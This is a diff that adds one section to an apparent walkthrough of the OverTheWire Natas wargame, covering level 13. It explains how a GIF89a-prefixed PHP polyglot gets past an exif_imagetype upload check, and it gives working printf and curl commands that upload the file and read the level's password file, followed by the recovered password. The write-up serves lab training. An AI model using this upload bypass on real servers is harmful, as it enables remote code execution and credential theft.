@@ -178,3 +178,18 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Verification:** `http://natas13.natas.labs.overthewire.org/` with `natas13:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L12.cast`
 
+## Level 13 → natas14
+- **Account:** `natas13`.
+- **Goal:** Same upload task as level 12, but the handler now validates the upload with `exif_imagetype($_FILES['uploadedfile']['tmp_name'])`.
+- **Technique and why it works:** `exif_imagetype` only inspects the file's magic bytes to decide whether it looks like an image; it does not require the whole file to be a valid image, and it does not check the extension. Prepending the six-byte GIF header `GIF89a` makes the file pass the check, while the rest of the file is still PHP code. We send `filename=shell.php` as before so it is stored with a `.php` extension and executed, and the PHP prints `/etc/natas_webpass/natas14`. The lesson: content sniffing on a prefix is bypassable with a polyglot file, and the extension must be enforced separately.
+- **Commands:**
+  ```
+  printf 'GIF89a' > /tmp/shell13.php
+  printf '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> /tmp/shell13.php
+  curl -s -u natas13:<pw> -F 'filename=shell.php' -F 'uploadedfile=@/tmp/shell13.php;type=image/gif' http://natas13.natas.labs.overthewire.org/index.php
+  curl -s -u natas13:<pw> http://natas13.natas.labs.overthewire.org/upload/<random>.php
+  ```
+- **Password for natas14:** `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`
+- **Verification:** `http://natas14.natas.labs.overthewire.org/` with `natas14:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L13.cast`
+
